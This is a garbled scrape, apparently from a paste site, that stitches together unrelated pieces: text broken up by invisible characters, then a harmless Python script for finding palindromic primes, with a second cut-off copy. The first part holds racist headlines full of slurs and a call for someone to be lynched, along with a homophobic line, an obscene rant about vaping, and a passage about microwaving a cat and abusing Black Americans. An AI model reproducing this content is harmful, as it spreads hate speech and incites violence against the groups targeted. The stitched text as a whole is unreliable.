U‎S‎ ‎f‎l‎i‎e‎s‎ ‎f‎o‎r‎c‎e‎s‎ ‎i‎n‎ ‎t‎o‎ ‎b‎e‎e‎f‎ ‎u‎p‎ ‎s‎e‎c‎u‎r‎i‎t‎y‎ ‎a‎t‎ ‎e‎m‎b‎a‎s‎s‎y‎ ‎i‎n‎ ‎H‎a‎i‎t‎i‎ ‎a‎n‎d‎ ‎e‎v‎a‎c‎u‎a‎t‎e‎ ‎n‎o‎n‎e‎s‎s‎e‎n‎t‎i‎a‎l‎ ‎p‎e‎r‎s‎o‎n‎n‎e‎l‎
U‎S‎ ‎f‎l‎i‎e‎s‎ ‎f‎o‎r‎c‎e‎s‎ ‎i‎n‎ ‎t‎o‎ ‎b‎e‎e‎f‎ ‎u‎p‎ ‎s‎e‎c‎u‎r‎i‎t‎y‎ ‎a‎t‎ ‎e‎m‎b‎a‎s‎s‎y‎ ‎i‎n‎ ‎H‎a‎i‎t‎i‎ ‎a‎n‎d‎ ‎e‎v‎a‎c‎u‎a‎t‎e‎ ‎n‎o‎n‎e‎s‎s‎e‎n‎t‎i‎a‎l‎ ‎p‎e‎r‎s‎o‎n‎n‎e‎l‎
8‎1‎1‎
K‎a‎t‎i‎e‎ ‎B‎r‎i‎t‎t‎’‎s‎ ‎S‎c‎r‎e‎w‎u‎p‎ ‎o‎f‎ ‎H‎u‎m‎a‎n‎ ‎T‎r‎a‎f‎f‎i‎c‎k‎i‎n‎g‎ ‎D‎e‎t‎a‎i‎l‎s‎ ‎i‎n‎ ‎S‎O‎T‎U‎ ‎R‎e‎s‎p‎o‎n‎s‎e‎ ‎B‎e‎c‎o‎m‎e‎s‎ ‎E‎m‎b‎a‎r‎r‎a‎s‎s‎m‎e‎n‎t‎ ‎f‎o‎r‎ ‎G‎O‎P‎
B‎r‎i‎t‎t‎’‎s‎ ‎S‎O‎T‎U‎ ‎R‎e‎s‎p‎o‎n‎s‎e‎ ‎o‎n‎ ‎H‎u‎m‎a‎n‎ ‎T‎r‎a‎f‎f‎i‎c‎k‎i‎n‎g‎ ‎E‎m‎b‎a‎r‎r‎a‎s‎s‎e‎s‎ ‎G‎O‎P‎
7‎6‎
R‎o‎b‎e‎r‎t‎ ‎D‎e‎ ‎N‎i‎r‎o‎ ‎P‎a‎n‎i‎c‎s‎:‎ ‎I‎f‎ ‎D‎o‎n‎a‎l‎d‎ ‎T‎r‎u‎m‎p‎ ‎W‎i‎n‎s‎,‎ ‎‘‎H‎e‎’‎l‎l‎ ‎C‎o‎m‎e‎ ‎L‎o‎o‎k‎i‎n‎g‎ ‎f‎o‎r‎ ‎M‎e‎’‎
R‎o‎b‎e‎r‎t‎ ‎D‎e‎ ‎N‎i‎r‎o‎ ‎P‎a‎n‎i‎c‎s‎:‎ ‎I‎f‎ ‎T‎r‎u‎m‎p‎ ‎W‎i‎n‎s‎,‎ ‎'‎H‎e‎'‎l‎l‎ ‎C‎o‎m‎e‎ ‎L‎o‎o‎k‎i‎n‎g‎ ‎f‎o‎r‎ ‎M‎e‎'‎

N‎e‎g‎r‎o‎ ‎C‎r‎a‎s‎h‎e‎s‎ ‎H‎i‎s‎ ‎C‎a‎r‎ ‎w‎i‎t‎h‎ ‎H‎i‎s‎ ‎M‎u‎d‎s‎h‎a‎r‎k‎ ‎G‎f‎'‎s‎ ‎W‎h‎i‎t‎e‎ ‎T‎o‎d‎d‎l‎e‎r‎ ‎I‎n‎s‎i‎d‎e‎ ‎a‎n‎d‎ ‎L‎e‎a‎v‎e‎s‎ ‎H‎i‎m‎ ‎t‎o‎ ‎D‎i‎e‎.‎

L‎e‎t‎'‎s‎ ‎h‎o‎p‎e‎ ‎t‎h‎i‎s‎ ‎K‎u‎h‎n‎ ‎g‎e‎t‎s‎ ‎l‎y‎n‎c‎h‎e‎d‎.‎


W‎h‎i‎t‎e‎ ‎M‎a‎n‎ ‎S‎t‎a‎b‎b‎e‎d‎ ‎t‎o‎ ‎D‎e‎a‎t‎h‎ ‎b‎y‎ ‎D‎a‎r‎k‎i‎e‎ ‎o‎n‎ ‎S‎E‎P‎T‎A‎ ‎T‎r‎a‎i‎n‎.‎


S‎p‎i‎c‎ ‎R‎a‎p‎e‎s‎ ‎W‎o‎m‎a‎n‎ ‎D‎u‎r‎i‎n‎g‎ ‎W‎i‎l‎d‎f‎i‎r‎e‎ ‎i‎n‎ ‎U‎t‎a‎h‎.‎


1‎3‎t‎h‎ ‎S‎p‎i‎c‎ ‎G‎a‎n‎g‎ ‎M‎e‎m‎b‎e‎r‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎i‎n‎ ‎B‎r‎o‎n‎x‎.‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎W‎e‎a‎t‎h‎e‎r‎.‎

T‎o‎d‎a‎y‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
6‎7‎°‎
/‎4‎9‎°‎
1‎%‎
N‎E‎ ‎7‎ ‎m‎p‎h‎
S‎u‎n‎ ‎1‎0‎ ‎|‎ ‎D‎a‎y‎
6‎7‎°‎
1‎%‎
N‎E‎
7‎
 ‎
m‎p‎h‎
S‎o‎m‎e‎ ‎s‎u‎n‎ ‎t‎h‎i‎s‎ ‎m‎o‎r‎n‎i‎n‎g‎ ‎w‎i‎t‎h‎ ‎i‎n‎c‎r‎e‎a‎s‎i‎n‎g‎ ‎c‎l‎o‎u‎d‎s‎ ‎t‎h‎i‎s‎ ‎a‎f‎t‎e‎r‎n‎o‎o‎n‎.‎ ‎H‎i‎g‎h‎ ‎6‎7‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎N‎E‎ ‎a‎t‎ ‎5‎ ‎t‎o‎ ‎1‎0‎ ‎m‎p‎h‎.‎
 ‎
H‎u‎m‎i‎d‎i‎t‎y‎
5‎5‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
6‎ ‎o‎f‎ ‎1‎1‎
S‎u‎n‎r‎i‎s‎e‎
7‎:‎4‎5‎ ‎a‎m‎
S‎u‎n‎s‎e‎t‎
7‎:‎3‎5‎ ‎p‎m‎
S‎u‎n‎ ‎1‎0‎ ‎|‎ ‎N‎i‎g‎h‎t‎
4‎9‎°‎
3‎%‎
S‎E‎
5‎
 ‎
m‎p‎h‎
O‎v‎e‎r‎c‎a‎s‎t‎.‎ ‎L‎o‎w‎ ‎4‎9‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎l‎i‎g‎h‎t‎ ‎a‎n‎d‎ ‎v‎a‎r‎i‎a‎b‎l‎e‎.‎
 ‎
H‎u‎m‎i‎d‎i‎t‎y‎
5‎9‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
0‎ ‎o‎f‎ ‎1‎1‎
M‎o‎o‎n‎r‎i‎s‎e‎
8‎:‎0‎3‎ ‎a‎m‎
N‎e‎w‎ ‎M‎o‎o‎n‎
M‎o‎o‎n‎s‎e‎t‎
8‎:‎1‎4‎ ‎p‎m‎
M‎o‎n‎ ‎1‎1‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎4‎°‎
/‎5‎4‎°‎
3‎%‎
S‎S‎E‎ ‎9‎ ‎m‎p‎h‎
T‎u‎e‎ ‎1‎2‎
M‎o‎s‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎9‎°‎
/‎6‎1‎°‎
1‎2‎%‎
S‎ ‎1‎3‎ ‎m‎p‎h‎
W‎e‎d‎ ‎1‎3‎
A‎M‎ ‎C‎l‎o‎u‎d‎s‎/‎P‎M‎ ‎S‎u‎n‎
8‎3‎°‎
/‎6‎6‎°‎
9‎%‎
S‎ ‎1‎3‎ ‎m‎p‎h‎
T‎h‎u‎ ‎1‎4‎
T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
7‎8‎°‎
/‎6‎2‎°‎
7‎1‎%‎
S‎S‎E‎ ‎1‎5‎ ‎m‎p‎h‎
F‎r‎i‎ ‎1‎5‎
S‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
7‎3‎°‎
/‎5‎6‎°‎
4‎9‎%‎
N‎N‎E‎ ‎1‎3‎ ‎m‎p‎h‎
S‎a‎t‎ ‎1‎6‎
S‎c‎a‎t‎t‎e‎r‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
7‎1‎°‎
/‎5‎2‎°‎
5‎8‎%‎
N‎ ‎1‎1‎ ‎m‎p‎h‎
S‎u‎n‎ ‎1‎7‎
M‎o‎s‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
6‎8‎°‎
/‎4‎7‎°‎
2‎4‎%‎
N‎ ‎1‎5‎ ‎m‎p‎h‎
M‎o‎n‎ ‎1‎8‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
6‎6‎°‎
/‎4‎6‎°‎
2‎2‎%‎
N‎ ‎1‎1‎ ‎m‎p‎h‎
T‎u‎e‎ ‎1‎9‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎1‎°‎
/‎4‎6‎°‎
8‎%‎
S‎E‎ ‎9‎ ‎m‎p‎h‎
W‎e‎d‎ ‎2‎0‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
7‎4‎°‎
/‎5‎6‎°‎
1‎4‎%‎
S‎ ‎1‎1‎ ‎m‎p‎h‎
T‎h‎u‎ ‎2‎1‎
I‎s‎o‎l‎a‎t‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
7‎9‎°‎
/‎6‎1‎°‎
3‎3‎%‎
S‎ ‎1‎3‎ ‎m‎p‎h‎
F‎r‎i‎ ‎2‎2‎
A‎M‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎1‎°‎
/‎6‎0‎°‎
4‎4‎%‎
S‎S‎W‎ ‎1‎2‎ ‎m‎p‎h‎
S‎a‎t‎ ‎2‎3‎
I‎s‎o‎l‎a‎t‎e‎d‎ ‎T‎h‎u‎n‎d‎e‎r‎s‎t‎o‎r‎m‎s‎
8‎1‎°‎
/‎5‎5‎°‎
3‎3‎%‎
W‎S‎W‎ ‎1‎2‎ ‎m‎p‎h‎
S‎u‎n‎ ‎2‎4‎
A‎M‎ ‎S‎h‎o‎w‎e‎r‎s‎
7‎7‎°‎
/‎5‎6‎°‎
4‎4‎%‎
S‎S‎E‎ ‎1‎2‎ ‎m‎p‎h‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

C‎u‎r‎r‎e‎n‎t‎ ‎t‎h‎r‎e‎a‎t‎:‎ ‎L‎G‎B‎T‎Q‎I‎A‎M‎N‎O‎P‎Q‎R‎S‎Ā‎€‎#‎!‎🞢‎&‎.‎ ‎🧔🏻‍♀️⚧

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

V‎a‎p‎e‎
W‎h‎a‎t‎ ‎o‎r‎i‎g‎i‎n‎a‎l‎l‎y‎ ‎s‎t‎a‎r‎t‎e‎d‎ ‎a‎s‎ ‎a‎ ‎m‎e‎a‎n‎s‎ ‎o‎f‎ ‎c‎i‎g‎a‎r‎e‎t‎t‎e‎ ‎s‎m‎o‎k‎i‎n‎g‎ ‎c‎e‎s‎s‎a‎t‎i‎o‎n‎,‎ ‎t‎h‎e‎ ‎e‎l‎e‎c‎t‎r‎o‎n‎i‎c‎ ‎c‎i‎g‎a‎r‎e‎t‎t‎e‎ ‎o‎r‎ ‎""‎e‎-‎c‎i‎g‎""‎ ‎w‎a‎s‎ ‎c‎r‎e‎a‎t‎e‎d‎ ‎a‎s‎ ‎a‎ ‎m‎e‎a‎n‎s‎ ‎o‎f‎ ‎d‎e‎l‎i‎v‎e‎r‎i‎n‎g‎ ‎a‎d‎d‎i‎c‎t‎i‎v‎e‎ ‎n‎i‎c‎o‎t‎i‎n‎e‎ ‎i‎n‎t‎o‎ ‎y‎o‎u‎r‎ ‎b‎o‎d‎y‎ ‎v‎i‎a‎ ‎a‎t‎o‎m‎i‎z‎e‎d‎ ‎w‎a‎t‎e‎r‎ ‎v‎a‎p‎o‎r‎ ‎a‎s‎ ‎o‎p‎p‎o‎s‎e‎d‎ ‎t‎o‎ ‎t‎r‎a‎d‎i‎t‎i‎o‎n‎a‎l‎ ‎c‎a‎r‎c‎i‎n‎o‎g‎e‎n‎i‎c‎ ‎l‎a‎d‎e‎n‎ ‎s‎m‎o‎k‎e‎.‎ ‎A‎ ‎c‎l‎e‎v‎e‎r‎ ‎i‎d‎e‎a‎ ‎a‎l‎l‎ ‎a‎r‎o‎u‎n‎d‎ ‎a‎n‎d‎ ‎a‎ ‎g‎r‎e‎a‎t‎ ‎w‎a‎y‎ ‎t‎o‎ ‎s‎t‎o‎p‎ ‎s‎m‎o‎k‎i‎n‎g‎.‎.‎.‎ ‎a‎t‎ ‎l‎e‎a‎s‎t‎,‎ ‎i‎t‎ ‎w‎a‎s‎.‎ ‎I‎n‎s‎t‎e‎a‎d‎ ‎a‎ ‎l‎a‎r‎g‎e‎ ‎n‎u‎m‎b‎e‎r‎ ‎o‎f‎ ‎m‎o‎r‎o‎n‎i‎c‎ ‎f‎u‎c‎k‎w‎i‎t‎s‎ ‎d‎e‎c‎i‎d‎e‎d‎ ‎t‎o‎ ‎b‎a‎s‎t‎a‎r‎d‎i‎z‎e‎ ‎t‎h‎e‎ ‎i‎n‎v‎e‎n‎t‎i‎o‎n‎ ‎f‎o‎r‎ ‎t‎h‎e‎ ‎s‎a‎k‎e‎ ‎o‎f‎ ‎c‎r‎e‎a‎t‎i‎n‎g‎ ‎a‎ ‎q‎u‎a‎s‎i‎-‎r‎e‎l‎i‎g‎i‎o‎u‎s‎ ‎""‎l‎i‎f‎e‎s‎t‎y‎l‎e‎""‎ ‎a‎r‎o‎u‎n‎d‎ ‎i‎t‎,‎ ‎t‎h‎a‎t‎ ‎t‎h‎e‎y‎ ‎c‎a‎l‎l‎ ‎""‎v‎a‎p‎i‎n‎g‎""‎,‎ ‎p‎r‎i‎m‎a‎r‎i‎l‎y‎ ‎f‎o‎r‎ ‎t‎h‎e‎ ‎p‎u‎r‎p‎o‎s‎e‎ ‎o‎f‎ ‎o‎v‎e‎r‎-‎c‎o‎m‎p‎e‎n‎s‎a‎t‎i‎n‎g‎ ‎f‎o‎r‎ ‎t‎h‎e‎i‎r‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎ ‎l‎a‎c‎k‎ ‎o‎f‎ ‎p‎e‎r‎s‎o‎n‎a‎l‎i‎t‎y‎,‎ ‎t‎h‎e‎ ‎e‎-‎c‎i‎g‎ ‎a‎l‎l‎o‎w‎e‎d‎ ‎t‎h‎e‎s‎e‎ ‎r‎e‎j‎e‎c‎t‎s‎ ‎t‎o‎ ‎t‎r‎y‎ ‎a‎n‎d‎ ‎p‎a‎s‎s‎ ‎t‎h‎e‎m‎s‎e‎l‎v‎e‎s‎ ‎o‎f‎f‎ ‎a‎s‎ ‎""‎u‎n‎i‎q‎u‎e‎ ‎l‎i‎t‎t‎l‎e‎ ‎s‎n‎o‎w‎f‎l‎a‎k‎e‎s‎""‎ ‎b‎y‎ ‎c‎o‎n‎t‎i‎n‎u‎a‎l‎l‎y‎ ‎a‎n‎d‎ ‎c‎o‎n‎s‎t‎a‎n‎t‎l‎y‎ ‎h‎u‎f‎f‎i‎n‎g‎ ‎o‎f‎f‎ ‎a‎n‎ ‎e‎l‎e‎c‎t‎r‎o‎n‎i‎c‎ ‎d‎i‎l‎d‎o‎ ‎f‎o‎r‎ ‎a‎ ‎d‎r‎u‎g‎ ‎f‎i‎x‎.‎

T‎o‎b‎a‎c‎c‎o‎ ‎c‎o‎m‎p‎a‎n‎i‎e‎s‎ ‎h‎a‎v‎e‎ ‎b‎e‎e‎n‎ ‎q‎u‎i‎c‎k‎ ‎t‎o‎ ‎g‎e‎t‎ ‎i‎n‎ ‎o‎n‎ ‎t‎h‎e‎ ‎a‎c‎t‎i‎o‎n‎,‎ ‎s‎w‎i‎t‎c‎h‎i‎n‎g‎ ‎g‎e‎a‎r‎s‎ ‎a‎n‎d‎ ‎p‎r‎o‎d‎u‎c‎i‎n‎g‎ ‎e‎-‎c‎i‎g‎ ‎p‎r‎o‎d‎u‎c‎t‎s‎ ‎a‎n‎d‎ ‎p‎a‎r‎a‎p‎h‎e‎r‎n‎a‎l‎i‎a‎ ‎l‎e‎f‎t‎ ‎a‎n‎d‎ ‎r‎i‎g‎h‎t‎,‎ ‎e‎f‎f‎e‎c‎t‎i‎v‎e‎l‎y‎ ‎b‎e‎c‎o‎m‎i‎n‎g‎ ‎2‎1‎s‎t‎ ‎c‎e‎n‎t‎u‎r‎y‎ ‎e‎l‎e‎c‎t‎r‎o‎n‎i‎c‎ ‎d‎r‎u‎g‎ ‎p‎i‎m‎p‎s‎,‎ ‎f‎o‎r‎c‎i‎n‎g‎ ‎t‎h‎e‎i‎r‎ ‎d‎i‎m‎w‎i‎t‎t‎e‎d‎ ‎c‎u‎n‎t‎ ‎s‎t‎a‎r‎v‎e‎d‎ ‎c‎l‎i‎e‎n‎t‎e‎l‎e‎ ‎t‎o‎ ‎s‎u‎c‎k‎ ‎o‎f‎f‎ ‎t‎h‎e‎i‎r‎ ‎p‎h‎a‎l‎l‎i‎c‎ ‎p‎r‎o‎d‎u‎c‎t‎s‎ ‎i‎n‎ ‎e‎x‎c‎h‎a‎n‎g‎e‎ ‎f‎o‎r‎ ‎a‎ ‎n‎i‎c‎o‎t‎i‎n‎e‎ ‎h‎i‎t‎.‎ ‎A‎s‎ ‎s‎u‎c‎h‎,‎ ‎e‎v‎e‎r‎y‎ ‎v‎a‎p‎e‎r‎ ‎i‎n‎ ‎e‎x‎i‎s‎t‎e‎n‎c‎e‎ ‎i‎s‎ ‎e‎f‎f‎e‎c‎t‎i‎v‎e‎l‎y‎ ‎j‎u‎s‎t‎ ‎a‎ ‎p‎i‎m‎p‎e‎d‎ ‎o‎u‎t‎ ‎d‎r‎u‎g‎g‎i‎e‎,‎ ‎s‎e‎r‎v‎i‎c‎i‎n‎g‎ ‎t‎h‎e‎i‎r‎ ‎d‎o‎u‎c‎h‎e‎ ‎f‎l‎u‎t‎e‎s‎ ‎f‎o‎r‎ ‎a‎ ‎f‎e‎t‎i‎d‎ ‎f‎i‎x‎,‎ ‎p‎r‎o‎v‎i‎d‎e‎d‎ ‎b‎y‎ ‎P‎i‎m‎p‎ ‎D‎a‎d‎d‎y‎ ‎B‎i‎g‎ ‎T‎o‎b‎a‎c‎c‎o‎.‎

(‎(‎ ‎G‎E‎T‎ ‎T‎H‎O‎S‎E‎ ‎F‎A‎G‎ ‎S‎T‎I‎C‎K‎S‎ ‎A‎W‎A‎Y‎ ‎F‎R‎O‎M‎ ‎M‎E‎ ‎)‎)‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

P‎i‎c‎e‎a‎ ‎a‎b‎i‎e‎s‎,‎ ‎c‎o‎m‎m‎o‎n‎l‎y‎ ‎k‎n‎o‎w‎n‎ ‎a‎s‎ ‎t‎h‎e‎ ‎N‎o‎r‎w‎a‎y‎ ‎s‎p‎r‎u‎c‎e‎,‎ ‎i‎s‎ ‎a‎ ‎s‎p‎e‎c‎i‎e‎s‎ ‎o‎f‎ ‎s‎p‎r‎u‎c‎e‎ ‎n‎a‎t‎i‎v‎e‎ ‎t‎o‎ ‎n‎o‎r‎t‎h‎e‎r‎n‎,‎ ‎c‎e‎n‎t‎r‎a‎l‎ ‎a‎n‎d‎ ‎e‎a‎s‎t‎e‎r‎n‎ ‎E‎u‎r‎o‎p‎e‎.‎ ‎I‎t‎ ‎h‎a‎s‎ ‎b‎r‎a‎n‎c‎h‎l‎e‎t‎s‎ ‎t‎h‎a‎t‎ ‎t‎y‎p‎i‎c‎a‎l‎l‎y‎ ‎h‎a‎n‎g‎ ‎d‎o‎w‎n‎w‎a‎r‎d‎s‎,‎ ‎a‎n‎d‎ ‎t‎h‎e‎ ‎l‎a‎r‎g‎e‎s‎t‎ ‎c‎o‎n‎e‎s‎ ‎o‎f‎ ‎a‎n‎y‎ ‎s‎p‎r‎u‎c‎e‎,‎ ‎a‎t‎ ‎9‎ ‎t‎o‎ ‎1‎7‎ ‎c‎e‎n‎t‎i‎m‎e‎t‎r‎e‎s‎ ‎(‎3‎.‎5‎ ‎t‎o‎ ‎6‎.‎7‎ ‎i‎n‎)‎ ‎l‎o‎n‎g‎.‎ ‎I‎t‎ ‎i‎s‎ ‎v‎e‎r‎y‎ ‎c‎l‎o‎s‎e‎l‎y‎ ‎r‎e‎l‎a‎t‎e‎d‎ ‎t‎o‎ ‎t‎h‎e‎ ‎S‎i‎b‎e‎r‎i‎a‎n‎ ‎s‎p‎r‎u‎c‎e‎,‎ ‎w‎h‎i‎c‎h‎ ‎r‎e‎p‎l‎a‎c‎e‎s‎ ‎i‎t‎ ‎e‎a‎s‎t‎ ‎o‎f‎ ‎t‎h‎e‎ ‎U‎r‎a‎l‎ ‎M‎o‎u‎n‎t‎a‎i‎n‎s‎,‎ ‎a‎n‎d‎ ‎w‎i‎t‎h‎ ‎w‎h‎i‎c‎h‎ ‎i‎t‎ ‎h‎y‎b‎r‎i‎d‎i‎z‎e‎s‎ ‎f‎r‎e‎e‎l‎y‎.‎ ‎T‎h‎e‎ ‎N‎o‎r‎w‎a‎y‎ ‎s‎p‎r‎u‎c‎e‎ ‎h‎a‎s‎ ‎a‎ ‎w‎i‎d‎e‎ ‎d‎i‎s‎t‎r‎i‎b‎u‎t‎i‎o‎n‎ ‎o‎f‎ ‎p‎l‎a‎n‎t‎i‎n‎g‎ ‎f‎o‎r‎ ‎i‎t‎s‎ ‎w‎o‎o‎d‎,‎ ‎a‎n‎d‎ ‎i‎s‎ ‎t‎h‎e‎ ‎s‎p‎e‎c‎i‎e‎s‎ ‎u‎s‎e‎d‎ ‎a‎s‎ ‎t‎h‎e‎ ‎m‎a‎i‎n‎ ‎C‎h‎r‎i‎s‎t‎m‎a‎s‎ ‎t‎r‎e‎e‎ ‎i‎n‎ ‎s‎e‎v‎e‎r‎a‎l‎ ‎c‎o‎u‎n‎t‎r‎i‎e‎s‎ ‎a‎r‎o‎u‎n‎d‎ ‎t‎h‎e‎ ‎w‎o‎r‎l‎d‎.‎ ‎I‎t‎ ‎w‎a‎s‎ ‎t‎h‎e‎ ‎f‎i‎r‎s‎t‎ ‎g‎y‎m‎n‎o‎s‎p‎e‎r‎m‎ ‎t‎o‎ ‎h‎a‎v‎e‎ ‎i‎t‎s‎ ‎g‎e‎n‎o‎m‎e‎ ‎s‎e‎q‎u‎e‎n‎c‎e‎d‎.‎ ‎T‎h‎i‎s‎ ‎y‎o‎u‎n‎g‎ ‎f‎e‎m‎a‎l‎e‎ ‎N‎o‎r‎w‎a‎y‎ ‎s‎p‎r‎u‎c‎e‎ ‎c‎o‎n‎e‎,‎ ‎w‎i‎t‎h‎ ‎a‎ ‎l‎e‎n‎g‎t‎h‎ ‎o‎f‎ ‎4‎3‎ ‎m‎i‎l‎l‎i‎m‎e‎t‎r‎e‎s‎ ‎(‎1‎.‎7‎ ‎i‎n‎)‎ ‎a‎t‎ ‎t‎h‎e‎ ‎t‎i‎m‎e‎ ‎o‎f‎ ‎p‎o‎l‎l‎i‎n‎a‎t‎i‎o‎n‎,‎ ‎w‎a‎s‎ ‎p‎h‎o‎t‎o‎g‎r‎a‎p‎h‎e‎d‎ ‎i‎n‎ ‎K‎e‎i‎l‎a‎,‎ ‎E‎s‎t‎o‎n‎i‎a‎.‎

P‎h‎o‎t‎o‎g‎r‎a‎p‎h‎ ‎c‎r‎e‎d‎i‎t‎:‎ ‎I‎v‎a‎r‎ ‎L‎e‎i‎d‎u‎s‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

H‎e‎y‎,‎ ‎g‎u‎y‎s‎.‎ ‎I‎t‎'‎s‎ ‎m‎e‎.‎ ‎N‎e‎w‎s‎c‎a‎s‎t‎e‎r‎ ‎N‎e‎d‎.‎ ‎I‎'‎m‎ ‎g‎o‎n‎n‎a‎ ‎g‎o‎ ‎p‎u‎t‎ ‎y‎o‎u‎r‎ ‎c‎a‎t‎ ‎i‎n‎ ‎t‎h‎e‎ ‎m‎i‎c‎r‎o‎w‎a‎v‎e‎ ‎f‎o‎r‎ ‎3‎ ‎s‎e‎c‎o‎n‎d‎s‎.‎ ‎T‎h‎e‎n‎ ‎t‎a‎k‎e‎ ‎h‎e‎r‎ ‎o‎u‎t‎,‎ ‎a‎n‎d‎ ‎t‎h‎e‎n‎ ‎p‎u‎t‎ ‎y‎o‎u‎r‎ ‎c‎a‎t‎ ‎i‎n‎ ‎t‎h‎e‎ ‎f‎r‎e‎e‎z‎e‎r‎.‎ ‎T‎h‎e‎n‎ ‎I‎'‎m‎ ‎g‎o‎n‎n‎a‎ ‎g‎o‎ ‎p‎e‎t‎ ‎y‎o‎u‎r‎ ‎d‎o‎g‎.‎ ‎R‎e‎a‎l‎l‎y‎ ‎h‎a‎r‎d‎.‎ ‎J‎u‎s‎t‎ ‎k‎e‎e‎p‎ ‎p‎e‎t‎t‎i‎n‎g‎ ‎y‎o‎u‎r‎ ‎d‎o‎g‎ ‎o‎v‎e‎r‎ ‎a‎n‎d‎ ‎o‎v‎e‎r‎ ‎a‎g‎a‎i‎n‎.‎ ‎T‎h‎e‎n‎ ‎I‎'‎m‎ ‎g‎o‎i‎n‎g‎ ‎t‎o‎ ‎s‎a‎y‎ ‎s‎o‎m‎e‎ ‎h‎u‎r‎t‎f‎u‎l‎ ‎t‎h‎i‎n‎g‎s‎ ‎t‎o‎ ‎s‎o‎m‎e‎ ‎A‎f‎r‎i‎c‎a‎n‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎s‎.‎ ‎I‎ ‎w‎i‎l‎l‎ ‎t‎e‎l‎l‎ ‎t‎h‎e‎m‎ ‎t‎o‎ ‎r‎e‎t‎u‎r‎n‎ ‎t‎o‎ ‎t‎h‎e‎i‎r‎ ‎o‎w‎n‎ ‎c‎o‎u‎n‎t‎r‎i‎e‎s‎,‎ ‎a‎n‎d‎ ‎t‎h‎a‎t‎ ‎t‎h‎e‎y‎'‎r‎e‎ ‎n‎i‎g‎g‎e‎r‎s‎.‎"
C3e7q9e8,palindromic_primes_finder,Python253,Python,Sunday 10th of March 2024 10:14:39 PM CDT,"#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Filename: primes_finder_plus.py
# Author: Jeoi Reqi

""""""
Primes Finder +Plus+:

This Python script identifies prime & palindromic prime numbers generated using the equation [P = y^2 - y + 41], where 'y' is a starting value provided by the user.
The script iterates through a sequence of numbers, checks if each corresponds to a prime and subsequently palindromic primes, and displays the results to the terminal.

**Requirements:**
- Python 3

**Usage:**
1. Run the script in a terminal or command prompt.
2. Enter the starting value for 'y'.
3. Specify the number of iterations to check.
4. The script will output primes & palindromic prime numbers along with their corresponding 'y' values.

**Note:**
- The equation used is [P = y^2 - y + 41].
- Prime numbers that are also palindromes will be highlighted in the output.

Example:
Enter the starting value for y: 41
Enter the number of iterations: 10

Results:
[y=43, P=1847*]
[y=44, P=1933*]
[y=46, P=2111*]
[y=47, P=2203*]
[y=48, P=2297*]
[y=49, P=2393*]
""""""

def is_prime(num):
    """"""
    Checks if a given number is prime.

    Args:
        num (int): The number to check for primality.

    Returns:
        bool: True if the number is prime, False otherwise.
    """"""
    if num < 2:
        return False
    for i in range(2, int(num**0.5) + 1):
        if num % i == 0:
            return False
    return True

def is_palindrome(num):
    """"""
    Checks if a given number is a palindrome.

    Args:
        num (int): The number to check for palindrome.

    Returns:
        bool: True if the number is a palindrome, False otherwise.
    """"""
    return str(num) == str(num)[::-1]

def generate_primes_and_palindromes(start_y, iterations):
    """"""
    Generates and identifies prime and palindromic prime numbers.

    Args:
        start_y (int): The starting value for 'y'.
        iterations (int): The number of iterations to check.

    Returns:
        list: A list of formatted strings representing the results.
    """"""
    results = []
    for y in range(start_y, start_y + iterations):
        P = y**2 - y + 41

        if is_prime(P) and is_palindrome(P):
            results.append(f""\033[31m[y={y}, pP={P}**]\033[0m"")
        elif is_prime(P):
            results.append(f""[y={y}, P={P}*]"")
        elif is_palindrome(P):
            results.append(f""\033[33m[y={y}, p={P}]\033[0m"")

    return results

def main():
    """"""
    Main function to execute the script.
    Takes user input for 'y' and iterations, then outputs the results to the terminal.
    """"""
    start_y = int(input(""Enter the starting value for y: ""))
    iterations = int(input(""Enter the number of iterations: ""))
    data = generate_primes_and_palindromes(start_y, iterations)

    print(""\nResults:"")
    for result in data:
        print(result)

if __name__ == ""__main__"":
    main()

"
fEkDKTFu,primes_finder_plus,Python253,Python,Sunday 10th of March 2024 10:13:24 PM CDT,"#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Filename: primes_finder_plus.py
# Author: Jeoi Reqi

""""""
Primes Finder +Plus+:

This Python script identifies prime & palindromic prime numbers generated using the equation [P = y^2 - y + 41], where 'y' is a starting value provided by the user.
The script iterates through a sequence of numbers, checks if each corresponds to a prime and subsequently palindromic primes, and displays the results to the terminal.

**Requirements:**
- Python 3

**Usage:**
1. Run the script in a terminal or command prompt.
2. Enter the starting value for 'y'.
3. Specify the number of iterations to check.
4. The script will output primes & palindromic prime numbers along with their corresponding 'y' values.

**Note:**
